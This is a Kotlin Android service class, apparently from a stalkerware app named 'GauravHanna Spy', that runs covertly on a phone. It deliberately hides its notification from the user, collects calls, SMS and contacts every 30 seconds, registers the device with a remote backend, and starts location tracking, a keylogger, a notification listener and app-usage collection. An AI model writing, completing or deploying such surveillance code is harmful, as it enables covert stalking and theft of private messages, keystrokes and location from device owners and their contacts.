package com.gauravhanna.spy

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat

class BackgroundService : Service() {

    companion object {
        private const val TAG = "BackgroundService"
        private const val CHANNEL_ID = "spy_channel"
        private const val NOTIFICATION_ID = 1001
        private var isRunning = false
        fun isNotRunning() = !isRunning
    }

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, getHiddenNotification())

        // Start data collection (automatically collects calls, SMS, contacts every 30 sec)
        DataCollector.start(this)

        // Register device with backend – use your actual MongoDB user _id
        val userId = ""   // ✅ REPLACE with your real user ID if needed

        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val deviceName = Build.MODEL
        val deviceModel = Build.MANUFACTURER + " " + Build.MODEL
        val androidVersion = Build.VERSION.RELEASE

        NetworkHelper.registerDevice(this, deviceId, deviceName, deviceModel, androidVersion, userId)

        // Start other optional services (location, keylogger, etc.)
        startOtherServices()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "GauravHanna Spy",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background monitoring service"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun getHiddenNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")   // empty title – invisible to user
            .setContentText("")    // empty text
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    private fun startOtherServices() {
        try {
            val locationIntent = Intent(this, LocationService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(locationIntent)
            } else {
                startService(locationIntent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start LocationService: ${e.message}")
        }

        try {
            startService(Intent(this, KeyloggerService::class.java))
        } catch (e: Exception) { }

        try {
            startService(Intent(this, NotificationListener::class.java))
        } catch (e: Exception) { }

        try {
            AppUsageCollector.start(this)
        } catch (e: Exception) { }
    }
}